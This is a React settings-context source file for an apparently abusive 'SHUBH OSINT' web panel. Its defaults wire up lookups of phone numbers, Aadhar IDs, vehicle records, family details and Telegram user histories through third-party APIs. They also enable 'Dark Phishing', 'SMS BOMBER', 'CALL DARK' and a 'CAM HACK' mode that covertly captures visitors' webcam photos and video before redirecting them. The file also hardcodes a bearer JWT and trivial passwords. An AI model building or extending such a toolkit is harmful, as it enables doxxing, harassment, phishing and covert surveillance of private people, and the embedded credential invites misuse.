import { createContext, useContext, useState, useEffect, ReactNode, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";

export interface TabConfig {
  id: string;
  label: string;
  icon: string;
  color: string;
  placeholder: string;
  searchType: string;
  apiUrl: string;
  enabled: boolean;
}

export interface TelegramToolConfig {
  id: string;
  label: string;
  enabled: boolean;
  cost: string;
}

export interface TelegramOsintSettings {
  jwtToken: string;
  baseUrl: string;
  tools: TelegramToolConfig[];
}

export interface AppSettings {
  sitePassword: string;
  adminPassword: string;
  theme: "dark" | "neon-green" | "neon-pink" | "neon-cyan";
  headerName1: string;
  headerName2: string;
  headerIcon: string;
  headerCustomLogo: string;
  headerColor1: string;
  headerColor2: string;
  headerFont: string;
  headerStyle: string;
  tabs: TabConfig[];
  // DARK DB settings
  darkDbUrl: string;
  darkDbHeight: string;
  darkDbBorderColor: string;
  darkDbBorderWidth: string;
  // Background settings
  backgroundImage: string;
  backgroundOpacity: string; // 0-100, lower = more visible background
  // Telegram OSINT settings
  telegramOsint: TelegramOsintSettings;
  // CAM HACK session (synced across all devices)
  camSessionId: string;
  // CAM HACK redirect URL for normal capture
  camRedirectUrl: string;
  // Custom HTML for capture page
  customCaptureHtml: string;
  // Chrome Custom HTML for chrome intent capture page
  chromeCustomHtml: string;
  // Iframe URL for iframe capture page
  camIframeUrl: string;
  // CAM HACK advanced settings
  camPhotoLimit: number; // 0 = unlimited
  camCaptureInterval: number; // milliseconds between capture cycles
  camVideoDuration: number; // video capture duration in seconds
  camCountdownTimer: number; // countdown timer for normal capture
  camAutoRedirect: boolean; // enable/disable auto redirect after capture
  camQuality: number; // JPEG quality 0.1 to 1.0
  // ALL SEARCH access key
  allSearchAccessKey: string;
  // Telegram OSINT access key
  telegramOsintAccessKey: string;
  // Password protection toggles
  sitePasswordEnabled: boolean;
  allSearchKeyEnabled: boolean;
  telegramKeyEnabled: boolean;
  // Credit system toggle
  creditSystemEnabled: boolean;
  // Page2 background music URL
  page2MusicUrl: string;
  // Main page background music URL
  mainPageMusicUrl: string;
  // Tab section size (small, medium, large)
  tabSize: "small" | "medium" | "large";
  // Section border settings
  sectionBorderColors: string[]; // Array of colors for rainbow border
  sectionBorderSpeed: number; // Animation speed in seconds (1-10)
  sectionTransparent: boolean; // true = transparent, false = solid
  // Tab particle settings
  tabParticleEnabled: boolean;
  tabParticleCount: number; // 1-5 particles
  tabParticleSpeed: number; // Animation speed multiplier
  // Call Dark settings
  callDarkEnabled: boolean;
  callDarkApiKey: string;
  callDarkAgentId: string;
  callDarkMaxDuration: number; // in seconds
  // Border enable/disable toggles
  headerBorderEnabled: boolean;
  tabContainerBorderEnabled: boolean;
   // Tab container separate border colors (10+ unique)
   tabContainerBorderColors: string[];
  // QR Code settings
  qrSize: number; // QR code size in pixels (100-300)
  qrFgColor: string; // Foreground color
  qrBgColor: string; // Background color
  qrIncludeLogo: boolean; // Include logo in center
   // Loader settings
   loaderImageUrl: string; // Custom loader image URL
}

const defaultTelegramTools: TelegramToolConfig[] = [
  { id: 'basic_info', label: 'BASIC INFO', enabled: true, cost: '0.10 credit' },
  { id: 'groups', label: 'GROUPS', enabled: true, cost: '5 credits' },
  { id: 'group_count', label: 'GROUP COUNT', enabled: true, cost: 'FREE' },
  { id: 'messages_count', label: 'MESSAGES COUNT', enabled: true, cost: 'FREE' },
  { id: 'messages', label: 'MESSAGES (LIMITED)', enabled: true, cost: '10 credits' },
  { id: 'stats_min', label: 'BASIC STATS', enabled: true, cost: 'FREE' },
  { id: 'stats', label: 'FULL STATS', enabled: true, cost: '1 credit' },
  { id: 'reputation', label: 'REPUTATION', enabled: true, cost: 'FREE' },
  { id: 'resolve_username', label: 'USERNAME RESOLVE', enabled: true, cost: '0.10 credit' },
  { id: 'username_usage', label: 'USERNAME USAGE', enabled: true, cost: '0.1 credit' },
  { id: 'usernames', label: 'USERNAMES HISTORY', enabled: true, cost: '3 credits' },
  { id: 'names', label: 'NAMES HISTORY', enabled: true, cost: '3 credits' },
  { id: 'stickers', label: 'STICKERS', enabled: true, cost: '1 credit' },
  { id: 'common_groups', label: 'COMMON GROUPS', enabled: true, cost: '5 credits' },
];

const defaultTabs: TabConfig[] = [
  { id: "phone", label: "Phone Search", icon: "Phone", color: "green", placeholder: "Enter phone number...", searchType: "phone", apiUrl: "https://userbotgroup.onrender.com/num?number=", enabled: true },
  { id: "numinfov2", label: "NUM INFO V2", icon: "Search", color: "cyan", placeholder: "Enter phone number...", searchType: "numinfov2", apiUrl: "https://userbotgroup.onrender.com/num?number=", enabled: true },
  { id: "aadhar", label: "Aadhar Search", icon: "CreditCard", color: "pink", placeholder: "Enter Aadhar number...", searchType: "aadhar", apiUrl: "", enabled: true },
  { id: "vehicle", label: "Vehicle CH", icon: "Car", color: "orange", placeholder: "Enter RC number...", searchType: "vehicle", apiUrl: "https://darknagi-osint-vehicle-api.vercel.app/api/vehicle?rc=", enabled: true },
  { id: "instagram", label: "Insta Search", icon: "Camera", color: "cyan", placeholder: "Enter username...", searchType: "instagram", apiUrl: "", enabled: true },
  { id: "family", label: "Family Info", icon: "Users", color: "purple", placeholder: "Enter name/number...", searchType: "family", apiUrl: "", enabled: true },
  { id: "manual", label: "Manual Paste", icon: "ClipboardPaste", color: "yellow", placeholder: "Enter number...", searchType: "manual", apiUrl: "https://hydrashop.in.net/number.php?q=", enabled: true },
  { id: "shubh", label: "Dark Phishing", icon: "Shield", color: "white", placeholder: "", searchType: "shubh", apiUrl: "", enabled: true },
  { id: "darkdb", label: "Webcam 360", icon: "Globe", color: "teal", placeholder: "", searchType: "darkdb", apiUrl: "https://2info.vercel.app", enabled: true },
  { id: "telegram", label: "Telegram OSI", icon: "Send", color: "blue", placeholder: "", searchType: "telegram", apiUrl: "", enabled: true },
  { id: "allsearch", label: "All Search", icon: "Globe", color: "red", placeholder: "Enter phone / email / name...", searchType: "allsearch", apiUrl: "https://lek-steel.vercel.app/api/search?q=", enabled: true },
  { id: "tgtonum", label: "Tg To Num", icon: "MessageCircle", color: "lime", placeholder: "Enter Telegram username...", searchType: "tgtonum", apiUrl: "", enabled: true },
  { id: "randipanel", label: "RANDI PANEL", icon: "Skull", color: "red", placeholder: "", searchType: "randipanel", apiUrl: "", enabled: true },
  { id: "smsbomber", label: "SMS BOMBER", icon: "Bomb", color: "orange", placeholder: "", searchType: "smsbomber", apiUrl: "", enabled: true },
  { id: "calldark", label: "CALL DARK", icon: "PhoneCall", color: "red", placeholder: "", searchType: "calldark", apiUrl: "", enabled: true },
  { id: "imagetoinfo", label: "Image to Info", icon: "Camera", color: "pink", placeholder: "", searchType: "imagetoinfo", apiUrl: "", enabled: true },
];

const defaultSettings: AppSettings = {
  sitePassword: "dark",
  adminPassword: "dark",
  theme: "dark",
  headerName1: "SHUBH",
  headerName2: "OSINT",
  headerIcon: "Zap",
  headerCustomLogo: "",
  headerColor1: "green",
  headerColor2: "pink",
  headerFont: "Orbitron",
  headerStyle: "normal",
  tabs: defaultTabs,
  // DARK DB defaults
  darkDbUrl: "https://shubhinfo.vercel.app/",
  darkDbHeight: "70",
  darkDbBorderColor: "purple",
  darkDbBorderWidth: "2",
  // Background defaults
  backgroundImage: "",
  backgroundOpacity: "30", // 30% overlay = 70% visible
  // Telegram OSINT defaults
  telegramOsint: {
    jwtToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI4MjcwODU1NTI3IiwianRpIjoiNDhiMmFjODktN2VkZS00NTRlLWE5MjAtODE0Nzg0OGEzYWE0IiwiZXhwIjoxNzk3NDQ0NjQ0fQ.SToaZbha-xTT5WDeJrUFoSzgmCVuBKxHVR6mpvGcwjUPXxcfWQFLqwOlqUtO99r9rRnR_ZNd229rg_qbLxUKLdQhQCeHYgwr-fDhesy0QwKJBLCE34hvDXjD9F1_SEsrynx-hBGBKWlZ13MjkYwSQs_vjm7WobIeY9MSMykzp1E",
    baseUrl: "https://funstat.info",
    tools: defaultTelegramTools,
  },
  // CAM HACK session - fixed session ID synced across all devices
  camSessionId: "shubhcam01",
  // CAM HACK redirect URL
  camRedirectUrl: "https://google.com",
  // Custom HTML for capture page
  customCaptureHtml: "",
  // Chrome Custom HTML for chrome intent capture page
  chromeCustomHtml: "",
  // Iframe URL for iframe capture page
  camIframeUrl: "",
  // CAM HACK advanced settings
  camPhotoLimit: 0, // 0 = unlimited
  camCaptureInterval: 500, // 500ms between captures
  camVideoDuration: 5, // 5 seconds video
  camCountdownTimer: 5, // 5 second countdown
  camAutoRedirect: true, // auto redirect enabled
  camQuality: 0.8, // 80% JPEG quality
  // ALL SEARCH access key (default empty means no protection)
  allSearchAccessKey: "darkosint",
  // Telegram OSINT access key
  telegramOsintAccessKey: "darkosint",
  // Password protection toggles
  sitePasswordEnabled: true,
  allSearchKeyEnabled: true,
  telegramKeyEnabled: true,
  // Credit system toggle
  creditSystemEnabled: true,
  // Page2 background music
  page2MusicUrl: "",
  // Main page background music
  mainPageMusicUrl: "/audio/background-music.mp3",
  // Tab size
  tabSize: "medium",
  // Section border settings
  sectionBorderColors: ["green", "cyan", "pink", "purple"],
  sectionBorderSpeed: 4,
  sectionTransparent: false,
  // Tab particle settings
  tabParticleEnabled: true,
  tabParticleCount: 3,
  tabParticleSpeed: 1,
  // Call Dark settings
  callDarkEnabled: false,
  callDarkApiKey: "",
  callDarkAgentId: "",
  callDarkMaxDuration: 20,
  // Border toggles defaults
  headerBorderEnabled: true,
  tabContainerBorderEnabled: true,
   // Tab container border colors (10+ unique, different from header)
   tabContainerBorderColors: ["lime", "aqua", "rose", "gold", "teal", "magenta", "coral", "violet", "sunset", "electric", "mint", "emerald"],
  // QR Code defaults
  qrSize: 180,
  qrFgColor: "#22c55e", // neon-green
  qrBgColor: "#000000", // black
  qrIncludeLogo: false,
   // Loader defaults
   loaderImageUrl: "", // Empty means use default bundled image
};

const mergeTabsWithDefaults = (tabs?: TabConfig[]): TabConfig[] => {
  const savedTabIds = tabs?.map((t) => t.id) || [];
  const newTabs = defaultTabs.filter((t) => !savedTabIds.includes(t.id));
  
  // Preserve user-customized colors - don't override with defaults
  const updatedTabs = (tabs || []).map(tab => ({
    ...tab,
    // Keep user's saved color, only fallback to default if color is missing
    color: tab.color || (defaultTabs.find(d => d.id === tab.id)?.color || 'green')
  }));
  
  return [...updatedTabs, ...newTabs];
};

const hydrateSettings = (partial?: Partial<AppSettings>): AppSettings => {
  const merged = { ...defaultSettings, ...(partial || {}) } as AppSettings;

  const mainPageMusicUrl = merged.mainPageMusicUrl?.trim()
    ? merged.mainPageMusicUrl
    : defaultSettings.mainPageMusicUrl;

  const page2MusicUrl = merged.page2MusicUrl?.trim()
    ? merged.page2MusicUrl
    : defaultSettings.page2MusicUrl;

   // Force new 12-color palette for tab container if not set or empty
   const tabContainerBorderColors = 
     merged.tabContainerBorderColors?.length > 0
       ? merged.tabContainerBorderColors
       : defaultSettings.tabContainerBorderColors;

  return {
    ...merged,
    mainPageMusicUrl,
    page2MusicUrl,
     tabContainerBorderColors,
    tabs: mergeTabsWithDefaults(partial?.tabs as TabConfig[] | undefined),
  };
};

const getInitialSettings = (): AppSettings => {
  try {
    const saved = localStorage.getItem("app_settings");
    if (!saved) return defaultSettings;
    const parsed = JSON.parse(saved) as Partial<AppSettings>;
    return hydrateSettings(parsed);
  } catch {
    return defaultSettings;
  }
};

interface SettingsContextType {
  settings: AppSettings;
  isLoaded: boolean;
  updateSettings: (newSettings: Partial<AppSettings>) => void;
  updateTab: (tabId: string, updates: Partial<TabConfig>) => void;
  updateTelegramTool: (toolId: string, updates: Partial<TelegramToolConfig>) => void;
  resetSettings: () => void;
  saveNow: () => Promise<void>;
}

const SettingsContext = createContext<SettingsContextType | undefined>(undefined);

export const SettingsProvider = ({ children }: { children: ReactNode }) => {
  const [settings, setSettings] = useState<AppSettings>(() => getInitialSettings());
  const [isLoaded, setIsLoaded] = useState(() => {
    try {
      return !!localStorage.getItem("app_settings");
    } catch {
      return false;
    }
  });

  const settingsRef = useRef(settings);
  useEffect(() => {
    settingsRef.current = settings;
  }, [settings]);

  const settingsRowIdRef = useRef<string | null>(null);
  const hasLocalEditsRef = useRef(false);
  const saveTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const saveChainRef = useRef<Promise<void>>(Promise.resolve());

  const saveToBackend = useCallback(async (nextSettings: AppSettings) => {
    try {
      const settingsJson = JSON.parse(JSON.stringify(nextSettings));

      // Resolve row id once (prevents repeated SELECTs and reduces race conditions)
      if (!settingsRowIdRef.current) {
        const { data: existing, error: existingError } = await supabase
          .from('app_settings')
          .select('id')
          .eq('setting_key', 'main_settings')
          .maybeSingle();

        if (!existingError && existing?.id) {
          settingsRowIdRef.current = existing.id;
        }
      }

      if (settingsRowIdRef.current) {
        const { error } = await supabase
          .from('app_settings')
          .update({ setting_value: settingsJson })
          .eq('id', settingsRowIdRef.current);

        if (error) throw error;
      } else {
        const { data, error } = await supabase
          .from('app_settings')
          .insert([{ setting_key: 'main_settings', setting_value: settingsJson }])
          .select('id')
          .single();

        if (error) throw error;
        if (data?.id) settingsRowIdRef.current = data.id;
      }
    } catch (err) {
      console.error('Error saving settings:', err);
    }
  }, []);

  const scheduleSave = useCallback(
    (nextSettings: AppSettings) => {
      // Always keep localStorage updated immediately
      try {
        localStorage.setItem("app_settings", JSON.stringify(nextSettings));
      } catch {
        // ignore
      }

      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current);
      }

      // Debounce backend writes to avoid out-of-order updates (token truncation/rollback)
      saveTimeoutRef.current = setTimeout(() => {
        const snapshot = nextSettings;
        saveChainRef.current = saveChainRef.current.then(() => saveToBackend(snapshot));
      }, 700);
    },
    [saveToBackend]
  );

  const saveNow = useCallback(async () => {
    if (saveTimeoutRef.current) {
      clearTimeout(saveTimeoutRef.current);
      saveTimeoutRef.current = null;
    }

    const snapshot = settingsRef.current;

    try {
      localStorage.setItem("app_settings", JSON.stringify(snapshot));
    } catch {
      // ignore
    }

    saveChainRef.current = saveChainRef.current.then(() => saveToBackend(snapshot));
    await saveChainRef.current;
  }, [saveToBackend]);

  // Load settings from backend on mount - ALWAYS prioritize backend over localStorage
  useEffect(() => {
    const loadSettings = async () => {
      try {
        const { data, error } = await supabase
          .from('app_settings')
          .select('id, setting_value')
          .eq('setting_key', 'main_settings')
          .maybeSingle();

        if (error) {
          console.error('Error loading settings:', error);
          // Fall back to localStorage only on error
          const saved = localStorage.getItem("app_settings");
          if (saved) {
            const parsed = JSON.parse(saved) as Partial<AppSettings>;
            setSettings(hydrateSettings(parsed));
          }
          return;
        }

        if (data?.id) settingsRowIdRef.current = data.id;

        // ALWAYS use backend settings - they are the source of truth
        // Only skip if user has ACTIVELY edited during this session (not from localStorage)
        if (data?.setting_value) {
          const parsed = data.setting_value as unknown as Partial<AppSettings>;
          const hydrated = hydrateSettings(parsed);
          setSettings(hydrated);
          // Also update localStorage to match backend
          try {
            localStorage.setItem("app_settings", JSON.stringify(hydrated));
          } catch {
            // ignore
          }
        }
      } catch (err) {
        console.error('Error loading settings:', err);
      } finally {
        setIsLoaded(true);
      }
    };

    loadSettings();
  }, []);

  const updateSettings = (newSettings: Partial<AppSettings>) => {
    hasLocalEditsRef.current = true;
    setSettings((prev) => {
      const updated = { ...prev, ...newSettings };
      scheduleSave(updated);
      return updated;
    });
  };

  const updateTab = (tabId: string, updates: Partial<TabConfig>) => {
    hasLocalEditsRef.current = true;
    setSettings((prev) => {
      const updated = {
        ...prev,
        tabs: prev.tabs.map((tab) => (tab.id === tabId ? { ...tab, ...updates } : tab)),
      };
      scheduleSave(updated);
      return updated;
    });
  };

  const updateTelegramTool = (toolId: string, updates: Partial<TelegramToolConfig>) => {
    hasLocalEditsRef.current = true;
    setSettings((prev) => {
      const updated = {
        ...prev,
        telegramOsint: {
          ...prev.telegramOsint,
          tools: prev.telegramOsint.tools.map((tool) =>
            tool.id === toolId ? { ...tool, ...updates } : tool
          ),
        },
      };
      scheduleSave(updated);
      return updated;
    });
  };

  const resetSettings = () => {
    hasLocalEditsRef.current = true;
    setSettings(defaultSettings);
    try {
      localStorage.removeItem("app_settings");
    } catch {
      // ignore
    }
    // Persist defaults (backend)
    scheduleSave(defaultSettings);
  };

  return (
    <SettingsContext.Provider
      value={{ settings, isLoaded, updateSettings, updateTab, updateTelegramTool, resetSettings, saveNow }}
    >
      {children}
    </SettingsContext.Provider>
  );
};

export const useSettings = () => {
  const context = useContext(SettingsContext);
  if (!context) {
    throw new Error("useSettings must be used within SettingsProvider");
  }
  return context;
};
